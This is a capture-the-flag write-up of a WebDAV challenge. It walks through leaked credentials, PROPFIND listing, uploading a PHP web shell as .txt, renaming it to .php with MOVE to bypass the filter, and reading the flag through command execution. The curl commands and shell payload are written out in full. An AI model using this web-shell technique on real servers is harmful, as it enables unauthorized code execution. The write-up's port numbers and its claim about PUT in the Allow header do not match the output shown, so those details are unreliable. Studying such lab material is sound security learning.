## Original Challenge Description

**ITA:**
"Mio cuggino mi ha fatto il nuovo sito per la mia azienda! Bellissimo no? Sempre una persona piena di opzioni."

**ENG:**
"My cousin made me a new website for my company! It's beautiful, isn't it? Always full of options."

---
## Knowledge

This challenge revolves around **WebDAV**, an extension of HTTP that allows remote file management.

Useful stuff to know:

* HTTP methods like **OPTIONS**, **PROPFIND**, **PUT**, **MOVE**
* Tools like `curl` or a WebDAV client such as `cadaver`
* Some valid credentials (which we’ll get easily)

---
## Installing cadaver (Optional)

If you want a nicer way to interact with WebDAV:

```bash
apt-get install cadaver
```

---
# Challenge Analysis

## index.html

The main page is a simple company page with an employee login portal.

A couple of things stand out immediately:
* There’s an HTML comment saying credentials are basically in the placeholders
* Username: `user`
* Password: `your_password`
* Footer hint mentions “multiple communication options”
* Server is running Apache + PHP, so executing `.php` files is on the table

---

# Exploitation Path

High-level idea:
1. Grab credentials leaked in the source code
2. Fuzz for hidden directories (WebDAV)
3. Abuse WebDAV methods
4. Upload a shell
5. Get the flag

---
## 1. Enumeration

The login panel didn’t really do anything interesting, so I moved on to fuzzing.
Used `ffuf` with `common.txt` and found:

```
/webdav/
```

As soon as I saw that, it was nice since I had seen a similar WebDAV misconfig a few weeks before at work, so I had good feelings that this was probably the right path.

**Check allowed methods**

```bash
curl -i -X OPTIONS http://sfide2026.itscybergame.it:10146/webdav/
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
DAV: 1,2
Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
```

Seeing `PUT` and `MOVE` here is already very promising.

---
## 2. PROPFIND (Directory Listing)

Now that we have creds, we can list files using WebDAV.

```bash
curl -i -X PROPFIND http://sfide2026.itscybergame.it:10146/webdav/ \
  -u "user:your_password" \
  -H "Depth: 1" \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><d:propfind xmlns:d="DAV:"><d:allprop/></d:propfind>'
```

Response shows:

```xml
<D:href>/webdav/secret_folder/</D:href>
```

---
### Using cadaver (easier way)

```bash
cadaver http://sfide2026.itscybergame.it:10143/webdav/
```

Login with:

```
user / your_password
```

Then list files:

```bash
dav:/webdav/> ls
```

```
secret_folder
```

---
## 3. PUT + MOVE Bypass


Uploading `.php` directly is blocked, so the strategy is:

* upload as `.txt`
* rename it later to `.php`

### Upload shell

```bash
curl -i -X PUT "http://sfide2026.itscybergame.it:10246/webdav/shell.txt" \
  -u "user:your_password" \
  -H "Content-Type: text/plain" \
  --data "<?php system(\$_GET['cmd']); ?>"
```

### Rename with MOVE

```bash
curl -i -X MOVE "http://sfide2026.itscybergame.it:10246/webdav/shell.txt" \
  -u "user:your_password" \
  -H "Destination: http://sfide2026.itscybergame.it:10246/webdav/shell.php"
```

And just like that, filter bypassed.

---
### Same thing with cadaver

```bash
dav:/webdav/> put shell.txt
dav:/webdav/> move shell.txt shell.php
```

---
## 4. RCE

Now we just use the shell:

```bash
curl "http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=ls+secret_folder" \
  -u "user:your_password"
```

Output:

```
secret.txt
```

---
# Get the Flag

```bash
curl "http://sfide2026.itscybergame.it:10246/webdav/shell.php?cmd=cat+secret_folder/secret.txt" \
  -u "user:your_password"
```

```
flag{W3bD4V_<SNIP>_ftw!}
```

---
## Final Notes

* The hint about “options” was pointing straight at HTTP methods
* WebDAV left enabled + weak filtering = easy win
* `MOVE` bypass is always worth trying when `PUT` is restricted

